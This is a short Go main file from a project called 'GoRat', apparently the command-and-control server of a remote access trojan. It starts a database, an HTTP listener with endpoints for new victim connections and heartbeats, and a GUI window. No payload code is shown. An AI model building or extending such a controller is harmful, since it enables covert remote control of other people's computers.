package main

import (
	"net/http"

	"github.com/NotKatsu/GoRat/gui/windows"
	"github.com/NotKatsu/GoRat/modules/database"
	"github.com/NotKatsu/GoRat/modules/endpoints"
	"github.com/pterm/pterm"

	go_rat "github.com/AllenDang/giu"
)

func main() {
	if database.CreateTables() {
		go func() {
			http.HandleFunc("/connection/new", endpoints.ConnectionNew)
			http.HandleFunc("/connection/heartbeat", endpoints.ConnectionHeartbeat)

			err := http.ListenAndServe(":8080", nil)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}()

		window := go_rat.NewMasterWindow("GoRat", 950, 550, go_rat.MasterWindowFlagsNotResizable)
		window.Run(windows.MainWindow)
	} else {
		pterm.Fatal.WithFatal(true).Println("There was an error when the database tables were trying to be created.")
	}
}
